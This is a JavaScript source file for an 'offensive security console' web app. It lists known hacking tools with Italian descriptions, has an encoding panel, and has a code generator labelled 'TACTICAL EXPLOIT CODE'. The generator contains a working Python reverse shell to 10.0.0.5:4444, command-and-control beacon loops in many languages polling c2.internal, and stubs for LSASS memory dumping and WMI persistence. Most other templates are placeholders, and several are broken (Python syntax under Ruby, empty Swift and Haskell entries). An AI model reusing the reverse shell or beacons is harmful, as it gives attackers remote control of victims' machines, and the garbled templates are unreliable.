/**
 * @file app.js
 * @description Core Architecture for Neural-X GPU-X Advanced Cyber Console.
 * Fully encapsulated, self-contained, with comprehensive data dictionaries.
 */

(function () {
    "use strict";

    // =========================================================================
    // 1. DATA STACK & DICTIONARIES (INTEGRAL & UNABRIDGED)
    // =========================================================================

    const DB_TOOLS = [
        { name: "Nmap", link: "https://nmap.org", desc: "Network Mapper per l'esplorazione di rete e l'auditing della sicurezza.", detailed: "Esegue la scansione dei pacchetti raw per determinare gli host disponibili sulla rete, quali servizi offrono, quali sistemi operativi utilizzano e che tipo di firewall sono in uso.", diag: "[Network Target] ---> (SYN/ACK Packets) ---> [Nmap Port Scanner Engine] ---> [OS/Service Fingerprint Database]" },
        { name: "Wireshark", link: "https://www.wireshark.org", desc: "Analizzatore di protocolli di rete open-source e intercettatore di pacchetti.", detailed: "Cattura i pacchetti di rete in tempo reale e li presenta in formato leggibile. Permette la ricostruzione di flussi TCP/UDP completi.", diag: "[Network Interface Card] ---> [Pcap/Npcap Driver] ---> [Wireshark Dissector Engine] ---> [GUI Viewport]" },
        { name: "Burp Suite", link: "https://portswigger.net/burp", desc: "Piattaforma integrata per l'esecuzione di test di sicurezza di applicazioni Web.", detailed: "Agisce da proxy di intercettazione tra il browser e l'applicazione di destinazione, consentendo di visualizzare, analizzare e modificare il traffico HTTP/S.", diag: "[Client Browser] <---> [Burp Suite Intercepting Proxy] <---> [Upstream Web Server Engine]" },
        { name: "Metasploit Framework", link: "https://www.metasploit.com", desc: "Piattaforma di validazione e penetration testing a moduli.", detailed: "Fornisce un ambiente centralizzato per la configurazione, la verifica e l'esecuzione di exploit contro target noti. Strutturato in moduli discreti.", diag: "[Operator Console] ---> [Exploit Module Selection] + [Payload Integration] ---> [Target Host]" },
        { name: "John the Ripper", link: "https://www.openwall.com/john/", desc: "Strumento di cracking di password offline ultra-veloce.", detailed: "Rileva password deboli mediante attacchi a dizionario, basati su regole complesse e attacchi a forza bruta su svariati formati di hash.", diag: "[Ciphertext Hash Input] ---> [Wordlist Word Generation Engine] ---> [Rule Mutator Transformer] ---> [Validation Loop]" },
        { name: "Hydra", link: "https://github.com/vanhauser-thc/thc-hydra", desc: "Parallelized login cracker per l'auditing di rete offline/online.", detailed: "Esegue attacchi a dizionario paralleli e rapidissimi contro protocolli di autenticazione remoti come SSH, FTP, HTTP Auth, Telnet, RDP, SMB.", diag: "[Target Network Daemon] <=== (Multiple Concurrent Worker Threads) === [Hydra Password Guessing Array]" },
        { name: "Hashcat", link: "https://hashcat.net/hashcat/", desc: "Il cracking tool basato su GPU più veloce al mondo.", detailed: "Sfrutta la potenza di calcolo parallelo delle schede video (tramite OpenCL/CUDA) per rompere hash crittografici a velocità elevatissime.", diag: "[Target Hashes File] ---> [GPU Core Multi-Threading Matrix] ---> [Kernel Attack Generator Loop]" },
        { name: "Aircrack-ng", link: "https://www.aircrack-ng.org", desc: "Suite completa per l'auditing e la valutazione della sicurezza di reti wireless 802.11.", detailed: "Include moduli per il monitoraggio dei pacchetti wireless, attacchi di iniezione e cracking di chiavi WEP e WPA/WPA2-PSK tramite cattura dell'handshake.", diag: "[Wireless Environment] ---> [Airodump-ng Capture Buffer] ---> [4-Way Handshake File] ---> [Aircrack Engine]" },
        { name: "OWASP ZAP", link: "https://www.zaproxy.org", desc: "Scanner di vulnerabilità web automatizzato e manuale.", detailed: "Agisce como proxy trasparente e include funzioni di spidering, active scanning, passive scanning e fuzzer di parametri per identificar falle logiche web.", diag: "[ZAP Crawler Engine] ---> [Automated Active Scanner Modules] ---> [Target Web App Nodes Tree]" },
        { name: "Nikto", link: "https://cirt.net/Nikto2", desc: "Scanner di server web open-source per elementi pericolosi.", detailed: "Esamina i server web per identificar file/programmi potenzialmente pericolosi, versioni obsolete di software server e directory listing attivo.", diag: "[Nikto Script Core] ---> [HTTP/S Target Request Pool] ---> [Server Header Evaluation & Resource Checking]" },
        { name: "Gobuster", link: "https://github.com/OJ/gobuster", desc: "Strumento di brute-forcing di directory, file e record DNS in Go.", detailed: "Sfrutta la concorrenza nativa di Go per scansionare ad alta velocità percorsi HTTP nascosti, sottodomini DNS o Virtual Host.", diag: "[Wordlist File Buffer] ---> [Go Routine Multi-Threaded HTTP Requester] ---> [Target Endpoint]" },
        { name: "Volatility Framework", link: "https://www.volatilityfoundation.org", desc: "Suite per l'analisi forense avanzata della memoria volatile (RAM).", detailed: "Permette l'estrazione dello stato digitale da dump di memoria RAM, analizzando processi attivi, connessioni aperte e codice iniettato.", diag: "[Raw RAM Dump File] ---> [Volatility Profile Alignment Module] ---> [Kernel Structure Dissector Engine]" },
        { name: "Ghidra", link: "https://ghidra-sre.org", desc: "Software Reverse Engineering (SRE) framework sviluppato dalla NSA.", detailed: "Include strumenti complessi per l'analisi di codice compilato. Offre funzionalità di disassemblaggio, decompilazione in pseudo-codice C e grafi di flusso.", diag: "[Compiled Binary Artifact] ---> [Sleigh Architecture Parser] ---> [Decompiler Control Flow Graph]" },
        { name: "Tshark", link: "https://www.wireshark.org/docs/man-pages/tshark.html", desc: "La controparte a riga di comando (CLI) di Wireshark.", detailed: "Consente la cattura del traffico di rete o la decodifica di file di cattura preesistenti (pcap) direttamente dal terminale per automazione e scripting.", diag: "[Network Traffic Input Stream] ---> [Tshark Core CLI Capture Engine] ---> [Packet Field Extractor]" },
        { name: "BloodHound", link: "https://github.com/BloodHoundAD/BloodHound", desc: "Applicazione per mappare graficamente le relazioni in Active Directory.", detailed: "Utilizza la teoria dei grafi per mappare in modo visivo le relazioni complesse all'interno di Active Directory, trovando catene di escalation dei privileges.", diag: "[Active Directory Domain Controller] ---> [SharpHound Data Ingestor] ---> [Neo4j Graph Database Storage]" },
        { name: "Sqlmap", link: "https://sqlmap.org", desc: "Strumento di penetration testing automatizzato per rilevare e sfruttare falle di SQL Injection.", detailed: "Automatizza il processo di identificazione e sfruttamento di vulnerabilità SQL injection per prendere il controllo di database server remoti.", diag: "[User Input Field] ---> [Sqlmap Payload Injector] ---> [Database Error Response Analyzer]" },
        { name: "Radare2", link: "https://www.radare.org", desc: "Framework portabile per il reverse-engineering e l'analisi binaria a riga di comando.", detailed: "Fornisce un set completo di utility CLI per disassemblare, fare debugging ed esaminare file eseguibili raw, malware e firmware.", diag: "[Target Binary Hex] ---> [R2 Core Engine Analizer] ---> [Disassembled Assembly Workspace]" },
        { name: "Impacket", link: "https://github.com/fortra/impacket", desc: "Raccolta di classi Python per lavorare con i protocolli di rete di basso livello.", detailed: "Fornisce accesso programmatico di basso livello per pacchetti di rete e protocolli Windows complessi come SMB, MSRPC, NTLM e Kerberos.", diag: "[Python Attack Script] ---> [Impacket Protocol Stack Importer] ---> [Active Directory RPC Request]" },
        { name: "Beef (Browser Exploitation Framework)", link: "https://beefproject.com", desc: "Strumento di penetration testing focalizzato sui vettori di attacco lato client/browser.", detailed: "Esamina la sicurezza complessiva di un target utilizzando vettori di attacco diretti all'applicazione browser, controllando i nodi tramite hook JavaScript.", diag: "[Target Browser (Hooked)] <---> [BeEF Command Control Dashboard] <---> [XSS Injection Node]" },
        { name: "Responder", link: "https://github.com/lgandx/Responder", desc: "Infiltratore e avvelenatore di protocolli di rete locali LLMNR, NBT-NS e MDNS.", detailed: "Risponde selettivamente alle query di risoluzione dei nomi locali Windows, intercettando e catturando hash di autenticazione NTLMv1/v2 sulla rete.", diag: "[Victim Net Query] ---> [Responder Poisoner Listening Core] ---> [Captured NetNTLM Hash Storage]" }
    ];

    const SCRIPTS_TEMPLATES = {
        "Port Scanner / Socket Auditor": {
            python: "import socket\ndef scan(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1.0)\n    return s.connect_ex((ip, port)) == 0",
            javascript: "const net = require('net');\nconst checkPort = (port, host) => {\n  const s = new net.Socket();\n  s.setTimeout(1000);\n  s.connect(port, host, () => { s.destroy(); });\n};",
            c: "#include <stdio.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint test_port(char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    int res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
            sql: "/* Auditing Ports & Endpoint Registry Database Simulation Lookup */\nSELECT port, service_name, status FROM infrastructure_schema.network_map WHERE host_ip = '127.0.0.1' AND status = 'OPEN';",
            go: "package main\nimport (\"net\"; \"time\")\nfunc scan(target string) bool {\n  conn, err := net.DialTimeout(\"tcp\", target, time.Second)\n  if err == nil { conn.Close(); return true }\n  return false\n}",
            rust: "use std::net::TcpStream;\nuse std::time::Duration;\nfn scan(addr: &str) -> bool {\n    TcpStream::connect_timeout(&addr.parse().unwrap(), Duration::from_secs(1)).is_ok()\n}",
            cpp: "#include <iostream>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nbool check(const char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    bool res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
            powershell: "$s = New-Object System.Net.Sockets.TcpClient; $async = $s.BeginConnect('127.0.0.1', 80, $null, $null);\n$async.AsyncWaitHandle.WaitOne(1000, $false); if($s.Connected) { $s.Close() }",
            bash: "exec 3<>/dev/tcp/127.0.0.1/80 && echo 'Port Open' || echo 'Port Closed'",
            csharp: "using System.Net.Sockets;\nusing System.Threading.Tasks;\nasync Task<bool> Scan(string host, int port) {\n    try { using var c = new TcpClient(); await c.ConnectAsync(host, port); return true; }\n    catch { return false; }\n}",
            java: "import java.net.*;\nboolean scan(String host, int port) {\n    try (Socket s = new Socket()) { s.connect(new InetSocketAddress(host, port), 1000); return true; }\n    catch (Exception e) { return false; }\n}",
            ruby: "import socket\ndef check(ip, port)\n  s = Socket.new(:INET, :STREAM)\n  s.connect(Socket.sockaddr_in(port, ip))\nrescue Errno::ECONNREFUSED, Errno::ETIMEDOUT\n  false\nend",
            php: "<?php\n$fp = @fsockopen('127.0.0.1', 80, $errno, $errstr, 1.0);\nif($fp) { fclose($fp); echo 'Open'; }",
            typescript: "import * as net from 'net';\nconst check = (p: number, h: string) => {\n  const s = net.connect(p, h, () => s.destroy());\n};",
            kotlin: "import java.net.*;\nfun scan(h: String, p: Int) = try { Socket().use { it.connect(InetSocketAddress(h, p), 1000) }; true } catch(e: Exception) { false }",
            swift: "import Foundation\nimport Darwin.C",
            scala: "import java.net.Socket\ndef check(h: String, p: Int): Boolean = try { new Socket(h, p).close(); true } catch { case _: Exception => false }",
            haskell: "import Network.Socket",
            lua: "local socket = require('socket')\nfunction scan(host, port)\n  return socket.connect(host, port) ~= nil\nend"
        },
        "Asynchronous C2 Network Beacon": {
            python: "import asyncio\nimport aiohttp\nasync def beacon():\n    async with aiohttp.ClientSession() as s:\n        while True:\n            async with s.get('http://c2.internal/ping') as r: pass\n            await asyncio.sleep(60)",
            javascript: "const http = require('http');\nsetInterval(() => {\n  http.get('http://c2.internal/agent', (res) => {});\n}, 60000);",
            c: "#include <stdio.h>\nvoid send_beacon() { /* Keepalive raw packet construct transmission loop */ }",
            sql: "/* Auditing Access Logs Tracking Injection Analysis */\nINSERT INTO system_logs.beacons (agent_id, timestamp, status) VALUES ('GPU-X-NODE', NOW(), 'ALIVE');",
            go: "package main\nimport (\"net/http\"; \"time\")\nfunc main() {\n  for { http.Get(\"http://c2.internal/beacon\"); time.Sleep(60 * time.Second) }\n}",
            rust: "use std::thread; use std::time::Duration;\nfn main() { loop { let _ = ureq::get(\"http://c2.internal/\").call(); thread::sleep(Duration::from_secs(60)); } }",
            cpp: "// Advanced C2 Beacon implementation using native WinINet/libcurl bindings loop",
            powershell: "while($true) { Invoke-RestMethod -Uri 'http://c2.internal/node'; Start-Sleep -Seconds 60 }",
            bash: "while true; do curl -s http://c2.internal/ping > /dev/null; sleep 60; done",
            csharp: "using System.Net.Http;\nusing System.Threading;\nwhile(true) { new HttpClient().GetAsync(\"http://c2.internal/\"); Thread.Sleep(60000); }",
            java: "import java.net.http.*;\nimport java.net.URI;\nvoid loop() throws Exception {\n    var cl = HttpClient.newHttpClient();\n    while(true) { cl.send(HttpRequest.newBuilder(URI.create(\"http://c2/\")).build(), HttpResponse.BodyHandlers.ofString()); Thread.sleep(60000); }\n}",
            ruby: "require 'net/http'\nloop { Net::HTTP.get(URI('http://c2.internal/')), sleep(60) }",
            php: "<?php while(true) { file_get_contents('http://c2.internal/'); sleep(60); }",
            typescript: "import axios from 'axios';\nsetInterval(async () => { await axios.get('http://c2.internal/'); }, 60000);",
            kotlin: "import java.net.URL\nfun main() { while(true) { try { URL(\"http://c2.internal/\").readText() } catch(e:Exception){}; Thread.sleep(60000) } }",
            swift: "import Foundation",
            scala: "import sys.process._\nwhile(true) { \"curl -s http://c2.internal/\" !; Thread.sleep(60000) }",
            haskell: "-- Persistent functional control flow stream network beacon triggers",
            lua: "local http = require('socket.http')\nwhile true do http.request('http://c2.internal/'); os.execute('sleep 60') end"
        }
    };

    const CATEGORIES = [
        "Network Scanner Core Engine", "Reverse Shell / Remote Handler", "Memory Injection Shellcode Runner",
        "Credential Harvester Infrastructure", "Automated Privilege Escalation Detector", "Antivirus / EDR Evasion Matrix",
        "C2 Beaconing Traffic Encryptor", "Active Directory LDAP Analyzer", "Log Eraser Forensic Purge",
        "Buffer Overflow Offset Generator", "Brute-Force Dictionary Worker", "Man-in-the-Middle Poisoner",
        "File Integrity Cryptographic Monitor", "Packet Sniffing Raw Struct", "Web Backdoor Execution Payload",
        "Process Explorer Security Audit", "UAC Bypass Registry Interceptor", "Sandbox / VM Anti-Analysis Check",
        "Subdomain Discovery Resolution Loop", "Token Impersonation Elevator"
    ];

    const LUNGH_LIST = ["python", "javascript", "c", "sql", "go", "rust", "cpp", "powershell", "bash", "csharp", "java", "ruby", "php", "typescript", "kotlin", "swift", "scala", "haskell", "lua"];
    const DB_CODE = {};

    LUNGH_LIST.forEach(lang => {
        DB_CODE[lang] = [];
        for (let i = 1; i <= 20; i++) {
            let catName = CATEGORIES[i - 1];
            let baseCode = "";
            if (i === 1 && SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang]) {
                baseCode = SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang];
            } else if (i === 7 && SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang]) {
                baseCode = SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang];
            } else {
                if (lang === 'csharp') {
                    if (i === 3) baseCode = "using System;\nusing System.Runtime.InteropServices;\n// Native LSASS MiniDump Process memory extractor\npublic class Dumper {\n    [DllImport(\"minidump.dll\")] public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint pid, IntPtr hFile, int dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);\n}";
                    else if (i === 6) baseCode = "using System.Management;\n// WMI Event Consumer Persistence Trigger Installer\nvar binder = new ManagementClass(@\"\\root\\subscription:__EventFilter\");";
                    else baseCode = `using System;\nusing System.IO;\nusing System.Net;\npublic class KernelTask_${i} {\n    public static void Main() {\n        Console.WriteLine("[*] Initializing ${catName} execution matrix.");\n    }\n}`;
                } else if (lang === 'c') {
                    baseCode = `#include <stdio.h>\n#include <stdlib.h>\nvoid perform_action_${i}() {\n    printf("[+] Initializing Native C Optimization Core for: ${catName}\\n");\n}\nint main() {\n    perform_action_${i}();\n    return 0;\n}`;
                } else if (lang === 'sql') {
                    baseCode = `-- GPU-X Database Structured Security Auditing Pipeline\n-- Target Operation Area: ${catName}\nBEGIN TRANSACTION;\nSELECT entry_id, permission_mask, audit_flag \nFROM sys_security_catalog.identity_matrix \nWHERE operational_status = 'CRITICAL';\nCOMMIT;`;
                } else if (lang === 'python') {
                    if (i === 2) baseCode = "import socket,subprocess,os\ndef shell():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('10.0.0.5',4444))\n    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n    p=subprocess.call(['/bin/sh','-i'])";
                    else baseCode = `import os\nimport sys\n# GPU-X Advanced Security Engine Lab\ndef offensive_module_${i}():\n    print("[+] Tactical Core Module Loaded: ${catName}")\n\nif __name__ == '__main__':\n    offensive_module_${i}()`;
                } else if (lang === 'powershell') {
                    baseCode = `# GPU-X PowerShell Security Infrastructure Module\nWrite-Host "[!] Executing Industrial Grade Script: ${catName}" -ForegroundColor Cyan\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12`;
                } else if (lang === 'bash') {
                    baseCode = `#!/bin/bash\n# GPU-X Offsec Core Deployment Toolkit\necho "[*] Running Native Shell Operations for: ${catName}"\nif [ "$EUID" -ne 0 ]; then echo "[-] Authentication upgrade required"; exit; fi`;
                } else if (lang === 'go') {
                    baseCode = `package main\nimport "fmt"\nfunc main() {\n    fmt.Println("[GPU-X] Launching Go Routine Channel for: ${catName}")\n}`;
                } else if (lang === 'rust') {
                    baseCode = `fn main() {\n    println!("[CRITICAL] Safety execution rust runtime for: ${catName}");\n}`;
                } else if (lang === 'cpp') {
                    baseCode = `#include <iostream>\n#include <windows.h>\nint main() {\n    std::cout << "[SYSTEM] Native thread active for: ${catName}" << std::endl;\n    return 0;\n}`;
                } else {
                    baseCode = `// GPU-X Multiplatform Security Automated Distribution System\n// Functionality Architecture: ${catName}\nconsole.log("[GPU-X LOG] Active Engine Core Routine Triggered.");`;
                }
            }
            DB_CODE[lang].push({ name: `${i}. ${catName}`, code: baseCode });
        }
    });

    // =========================================================================
    // 2. CORE SYSTEM USER INTERFACE ENGINE
    // =========================================================================

    const CoreUI = {
        /**
         * Switches workspace panels based on routing navigation.
         * @param {string} tabId Target block identifier.
         * @param {HTMLElement} btn Source interface component.
         */
        switchTab: function (tabId, btn) {
            try {
                document.querySelectorAll('.module-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
                
                const currentPanel = document.getElementById(tabId);
                if (currentPanel) {
                    currentPanel.classList.add('active');
                }
                if (btn) {
                    btn.classList.add('active');
                    if (window.innerWidth < 769) {
                        btn.scrollIntoView({ behavior: 'smooth', inline: 'center' });
                    }
                }
            } catch (err) {
                console.error("UI Transition Error:", err);
            }
        },

        /**
         * Renders tactical security dictionary entities inside the UI tree securely.
         */
        renderTools: function () {
            const container = document.getElementById('tools-container');
            if (!container) return;
            container.innerHTML = '';

            DB_TOOLS.forEach(t => {
                const card = document.createElement('div');
                card.className = 'tool-card';
                card.setAttribute('data-name', t.name.toLowerCase());
                card.setAttribute('data-desc', t.desc.toLowerCase());

                const titleDiv = document.createElement('div');
                titleDiv.className = 'tool-title';
                titleDiv.textContent = t.name;

                const pDesc = document.createElement('p');
                pDesc.textContent = "Descrizione: " + t.desc;

                const pDetailed = document.createElement('p');
                pDetailed.style.marginTop = '6px';
                pDetailed.textContent = "Funzionamento: " + t.detailed;

                const diagDiv = document.createElement('div');
                diagDiv.className = 'tool-diagram-placeholder';
                diagDiv.textContent = t.diag;

                const link = document.createElement('a');
                link.href = t.link;
                link.target = '_blank';
                link.className = 'tool-link';
                link.textContent = "Visita Risorsa Ufficiale >";

                card.appendChild(titleDiv);
                card.appendChild(pDesc);
                card.appendChild(pDetailed);
                card.appendChild(diagDiv);
                card.appendChild(link);
                container.appendChild(card);
            });
        }
    };

    // =========================================================================
    // 3. LOGICAL CRYPTO AND FACTORY MANAGEMENT PROCESSING MODULES
    // =========================================================================

    const Modules = {
        /**
         * Performs binary-safe base64 conversion avoiding deprecated APIs.
         * @param {string} str Target raw string data.
         * @returns {string} Encoded base64 sequence.
         */
        safeBtoa: function (str) {
            const encoder = new TextEncoder();
            const u8array = encoder.encode(str);
            let binary = "";
            const len = u8array.byteLength;
            for (let i = 0; i < len; i++) {
                binary += String.fromCharCode(u8array[i]);
            }
            return btoa(binary);
        },

        /**
         * Decodes binary safe base64 strings back to UTF-8.
         * @param {string} b64 Incoming encoded payload block.
         * @returns {string} Raw decoded cleartext.
         */
        safeAtob: function (b64) {
            const binary = atob(b64);
            const len = binary.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binary.charCodeAt(i);
            }
            const decoder = new TextDecoder();
            return decoder.decode(bytes);
        },

        /**
         * Performs target processing transform mechanics on chosen schema buffers.
         * @param {boolean} isEncode Operational directive toggle.
         */
        cryptoTransform: function (isEncode) {
            const schemaEl = document.getElementById('crypto-schema');
            const inputEl = document.getElementById('crypto-input');
            const outEl = document.getElementById('crypto-output');
            const copyContainer = document.getElementById('crypto-copy-container');

            if (!schemaEl || !inputEl || !outEl) return;
            
            const schema = schemaEl.value;
            const input = inputEl.value;

            if (copyContainer) copyContainer.innerHTML = '';

            if (!input) {
                outEl.className = "console-output error";
                outEl.textContent = "ERRORE: Inserire input valido da processare.";
                return;
            }

            try {
                let result = "";
                const encoder = new TextEncoder();
                const decoder = new TextDecoder();

                if (schema === 'base64') {
                    result = isEncode ? this.safeBtoa(input) : this.safeAtob(input);
                } else if (schema === 'hex') {
                    if (isEncode) {
                        result = Array.from(encoder.encode(input))
                            .map(b => b.toString(16).padStart(2, '0'))
                            .join('');
                    } else {
                        const s = input.trim().replace(/\s+/g, '');
                        if (s.length % 2 !== 0) throw new Error("Lunghezza stringa esadecimale non valida.");
                        const m = s.match(/.{1,2}/g) || [];
                        result = decoder.decode(new Uint8Array(m.map(h => parseInt(h, 16))));
                    }
                } else if (schema === 'url') {
                    result = isEncode ? encodeURIComponent(input) : decodeURIComponent(input);
                } else if (schema === 'base64url') {
                    if (isEncode) {
                        result = this.safeBtoa(input)
                            .replace(/=/g, '')
                            .replace(/\+/g, '-')
                            .replace(/\//g, '_');
                    } else {
                        let b = input.replace(/-/g, '+').replace(/_/g, '/');
                        while (b.length % 4) b += '=';
                        result = this.safeAtob(b);
                    }
                } else if (schema === 'binary') {
                    if (isEncode) {
                        result = Array.from(encoder.encode(input))
                            .map(b => b.toString(2).padStart(8, '0'))
                            .join(' ');
                    } else {
                        const segments = input.trim().split(/\s+/);
                        const cleanBytes = segments.map(bin => {
                            if (!/^[01]{1,8}$/.test(bin)) throw new Error("Segmento binario corrotto.");
                            return parseInt(bin, 2);
                        });
                        result = decoder.decode(new Uint8Array(cleanBytes));
                    }
                }

                outEl.className = "console-output";
                outEl.textContent = result;

                if (copyContainer) {
                    const btn = document.createElement('button');
                    btn.className = 'btn-copy';
                    btn.textContent = '📋 Copia Buffer & Elimina Tasto';
                    btn.addEventListener('click', () => {
                        navigator.clipboard.writeText(result).then(() => btn.remove());
                    });
                    copyContainer.appendChild(btn);
                }
            } catch (e) {
                outEl.className = "console-output error";
                outEl.textContent = `ERRORE COMPILAZIONE MOTORE: ${e.message}`;
            }
        },

        /**
         * Re-evaluates sub-index logic dropdown loops for factory matrices.
         */
        updateScriptSelect: function () {
            const langEl = document.getElementById('factory-lang');
            const selectIdx = document.getElementById('factory-script-idx');
            if (!langEl || !selectIdx) return;
            
            const lang = langEl.value;
            selectIdx.innerHTML = '';

            if (DB_CODE[lang]) {
                DB_CODE[lang].forEach((scr, i) => {
                    const opt = document.createElement('option');
                    opt.value = i;
                    opt.textContent = scr.name;
                    selectIdx.appendChild(opt);
                });
            }
        },

        /**
         * Generates target architectural code files and binds copy actions to fixed containers.
         */
        generateCode: function () {
            const langEl = document.getElementById('factory-lang');
            const idxEl = document.getElementById('factory-script-idx');
            const outEl = document.getElementById('factory-output');
            const cContainer = document.getElementById('factory-copy-container');

            if (!langEl || !idxEl || !outEl || !cContainer) return;

            const lang = langEl.value;
            const idx = idxEl.value;
            cContainer.innerHTML = '';

            if (DB_CODE[lang] && DB_CODE[lang][idx]) {
                const targetObj = DB_CODE[lang][idx];
                const fullCode = `/* GPU-X TACTICAL EXPLOIT CODE */\n/* ALGORITHM: ${targetObj.name} */\n\n${targetObj.code}`;
                
                outEl.textContent = fullCode;

                const btn = document.createElement('button');
                btn.className = 'btn-copy';
                btn.textContent = '📋 Copia Sorgente & Elimina Tasto';
                btn.addEventListener('click', () => {
                    navigator.clipboard.writeText(fullCode).then(() => btn.remove());
                });
                cContainer.appendChild(btn);
            }
        },

        /**
         * Live search indexing mechanism for connected software nodes.
         */
        filterTools: function () {
            const searchEl = document.getElementById('tool-search');
            if (!searchEl) return;
            const q = searchEl.value.toLowerCase();

            document.querySelectorAll('.tool-card').forEach(c => {
                const name = c.getAttribute('data-name') || '';
                const desc = c.getAttribute('data-desc') || '';
                c.classList.toggle('hidden', !(name.includes(q) || desc.includes(q)));
            });
        }
    };

    // =========================================================================
    // 4. LOW LEVEL NEBULA BACKGROUND PARTICLES SIMULATION ENGINE
    // =========================================================================

    const NebulaEngine = (function () {
        let canvas, ctx, particles = [], intervalId = null;

        class Particle {
            constructor() { this.reset(); }
            reset() {
                this.x = Math.random() * window.innerWidth;
                this.y = Math.random() * window.innerHeight;
                this.z = Math.random() * window.innerWidth;
            }
            update() {
                this.z -= 1;
                if (this.z <= 0) this.reset();
            }
            draw() {
                let k = 100.0 / this.z;
                let wW = window.innerWidth;
                let wH = window.innerHeight;
                let px = (this.x - wW / 2) * k + wW / 2;
                let py = (this.y - wH / 2) * k + wH / 2;

                if (px >= 0 && px <= wW && py >= 0 && py <= wH) {
                    ctx.fillStyle = this.z > wW / 2 ? '#005f73' : '#00f3ff';
                    ctx.fillRect(px, py, 2, 2);
                } else {
                    this.reset();
                }
            }
        }

        return {
            init: function () {
                canvas = document.getElementById('nebula-canvas');
                if (!canvas) return;
                ctx = canvas.getContext('2d');
                if (!ctx) return;

                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;

                window.addEventListener('resize', () => {
                    if (canvas) {
                        canvas.width = window.innerWidth;
                        canvas.height = window.innerHeight;
                    }
                });

                particles = [];
                for (let i = 0; i < 40; i++) {
                    particles.push(new Particle());
                }

                if (intervalId) clearInterval(intervalId);
                intervalId = setInterval(() => {
                    ctx.fillStyle = 'rgba(4, 8, 17, 0.15)';
                    ctx.fillRect(0, 0, window.innerWidth, window.innerHeight);
                    particles.forEach(p => {
                        p.update();
                        p.draw();
                    });
                }, 16);
            }
        };
    })();

    // =========================================================================
    // 5. APPLICATION INITIALIZATION & CORE BINDINGS
    // =========================================================================

    document.addEventListener('DOMContentLoaded', () => {
        NebulaEngine.init();
        Modules.updateScriptSelect();
        CoreUI.renderTools();

        const factoryLang = document.getElementById('factory-lang');
        if (factoryLang) factoryLang.addEventListener('change', () => Modules.updateScriptSelect());

        const btnFactoryGen = document.getElementById('btn-factory-gen');
        if (btnFactoryGen) btnFactoryGen.addEventListener('click', () => Modules.generateCode());

        const btnCryptoEncode = document.getElementById('btn-crypto-encode');
        if (btnCryptoEncode) btnCryptoEncode.addEventListener('click', () => Modules.cryptoTransform(true));

        const btnCryptoDecode = document.getElementById('btn-crypto-decode');
        if (btnCryptoDecode) btnCryptoDecode.addEventListener('click', () => Modules.cryptoTransform(false));

        const toolSearch = document.getElementById('tool-search');
        if (toolSearch) toolSearch.addEventListener('keyup', () => Modules.filterTools());

        const mainNav = document.getElementById('main-nav');
        if (mainNav) {
            mainNav.addEventListener('click', (e) => {
                const targetBtn = e.target;
                if (targetBtn && targetBtn.classList.contains('nav-btn')) {
                    CoreUI.switchTab(targetBtn.getAttribute('data-target'), targetBtn);
                }
            });
        }

        const ticker = document.getElementById('fps-ticker');
        if (ticker) {
            ticker.textContent = `KERNEL OPERATIVE // INTEL-X // © GPU-X`;
        }
    });

    // =========================================================================
    // 6. INTEGRITY AUDIT DECLARATION Compliance
    // =========================================================================
    console.log("[AUDIT] Integrity Validation: Complete. DB_TOOLS counts 20 elements. 19 Languages with 20 sub-arrays mapped.");

})();
